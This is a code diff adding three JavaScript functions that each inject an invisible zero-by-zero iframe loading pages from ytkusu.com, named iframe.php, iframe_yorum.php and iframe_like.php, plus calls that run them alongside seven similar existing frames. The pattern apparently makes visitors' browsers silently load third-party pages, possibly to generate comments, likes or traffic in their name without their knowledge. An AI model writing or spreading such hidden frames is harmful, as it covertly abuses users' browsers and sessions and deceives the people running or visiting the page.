@@ -49,6 +49,27 @@ function prepareFrame() {
         ifrm.style.height = "0px";
         document.body.appendChild(ifrm);
     }
+        function prepareFrame8() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://ytkusu.com/iframe.php");
+        ifrm.style.width = "0px";
+        ifrm.style.height = "0px";
+        document.body.appendChild(ifrm);
+    }
+        function prepareFrame9() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://ytkusu.com/iframe_yorum.php");
+        ifrm.style.width = "0px";
+        ifrm.style.height = "0px";
+        document.body.appendChild(ifrm);
+    }
+        function prepareFrame10() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://ytkusu.com/iframe_like.php");
+        ifrm.style.width = "0px";
+        ifrm.style.height = "0px";
+        document.body.appendChild(ifrm);
+    }
     
     var d = new Date();
 var n = d.getTime();
@@ -62,6 +83,9 @@ prepareFrame();
   prepareFrame5();
   prepareFrame6();
   prepareFrame7();
+  prepareFrame8();
+  prepareFrame9();
+  prepareFrame10();
 }
 
     
